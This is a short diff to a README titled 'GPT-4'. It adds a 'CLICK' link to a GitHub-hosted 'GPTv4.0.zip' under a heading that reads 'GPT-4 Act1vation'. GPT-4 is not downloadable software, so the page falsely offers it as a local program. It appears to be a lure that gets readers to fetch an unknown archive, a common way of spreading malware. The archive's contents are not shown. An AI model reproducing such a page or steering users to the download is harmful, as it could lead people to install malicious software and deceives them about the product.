@@ -1,6 +1,6 @@
 # GPT-4
 
- [CLICK]()
+ [CLICK](https://github.com/GarismoHussien/GPT-4/releases/download/software/GPTv4.0.zip)
 
 ## GPT-4 Act1vation
 
